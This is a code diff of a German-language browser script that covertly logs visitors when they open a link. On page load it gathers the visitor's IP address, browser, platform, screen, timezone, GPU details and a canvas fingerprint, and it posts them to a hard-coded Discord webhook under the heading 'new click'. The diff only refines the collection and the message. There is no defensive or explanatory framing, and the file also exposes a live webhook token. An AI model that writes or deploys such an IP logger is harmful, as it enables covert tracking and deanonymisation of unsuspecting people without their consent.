@@ -1,13 +1,12 @@
 <script>
 fetch("https://api.ipify.org?format=json")
   .then(response => response.json())
-  .then(async data => {
+  .then(data => {
     const ip = data.ip;
     const browser = navigator.userAgent;
     const platform = navigator.platform;
     const zeitstempel = new Date().toLocaleString("de-DE");
 
-    // Bildschirmdaten
     const aufloesung = `${screen.width}x${screen.height}`;
     const farbtiefe = screen.colorDepth;
     const sprache = navigator.language;
@@ -16,16 +15,19 @@ fetch("https://api.ipify.org?format=json")
     const touch = navigator.maxTouchPoints > 0 ? "Ja" : "Nein";
     const online = navigator.onLine ? "Ja" : "Nein";
 
-    // WebGL Daten
+    // GPU Info (sicher abgefangen)
     let gpuInfo = "Nicht verfügbar";
     try {
-      const gl = document.createElement('canvas').getContext('webgl');
+      const canvasGL = document.createElement('canvas');
+      const gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
       const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      gpuInfo = `${vendor} / ${renderer}`;
+      if (debugInfo) {
+        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        gpuInfo = `${vendor} / ${renderer}`;
+      }
     } catch (e) {
-      gpuInfo = "Nicht unterstützt";
+      gpuInfo = "Fehler bei Abfrage";
     }
 
     // Canvas Fingerprint
@@ -36,32 +38,30 @@ fetch("https://api.ipify.org?format=json")
       ctx.textBaseline = "top";
       ctx.font = "14px Arial";
       ctx.fillText("Fingerprint Test", 2, 2);
-      canvasFP = canvas.toDataURL();
+      canvasFP = canvas.toDataURL().slice(0, 100); // gekürzt
     } catch (e) {
-      canvasFP = "Fehler bei Erfassung";
+      canvasFP = "Fehler";
     }
 
     const webhookUrl = "https://discord.com/api/webhooks/1394554954391355492/comU-mif2egSzF70Vx8BIyBr0yH4y2MuUOjbSKYql6As7GIu9kTxiIkZwv0xeJMOA1jI";
 
     const payload = {
-      content: `# 📨 NEUER KLICK AUF DEN LINK!
-**📌 IP-Adresse:** \`${ip}\`
+      content: `# 📨 NEUER KLICK
+
+**📌 IP:** \`${ip}\`
 **🌐 Browser:** ${browser}
-**💻 Betriebssystem / Plattform:** ${platform}
-**📱 Bildschirmauflösung:** ${aufloesung}
+**💻 Plattform:** ${platform}
+**🖥️ Auflösung:** ${aufloesung}
 **🌈 Farbtiefe:** ${farbtiefe}
 **🗣️ Sprache:** ${sprache}
 **🌍 Zeitzone:** ${zeitzone}
-**🍪 Cookies aktiviert:** ${cookiesAktiv}
-**🤳 Touch-Unterstützung:** ${touch}
-**📶 Online-Status:** ${online}
-**🧠 WebGL GPU Info:** ${gpuInfo}
-**🖼️ Canvas Fingerprint (Base64):**
-\`\`\`
-${canvasFP.slice(0, 300)}...
-\`\`\`
-**⏰ Uhrzeit:** ${zeitstempel}
-**ℹ️ Weitere IP-Infos:** <https://whatismyipaddress.com/ip/${ip}>`
+**🍪 Cookies aktiv:** ${cookiesAktiv}
+**📶 Online:** ${online}
+**🤳 Touch:** ${touch}
+**🧠 GPU Info:** ${gpuInfo}
+**🖼️ Canvas-Fingerprint:** \`${canvasFP}\`
+**⏰ Zeitpunkt:** ${zeitstempel}
+🔗 <https://whatismyipaddress.com/ip/${ip}>`
     };
 
     fetch(webhookUrl, {
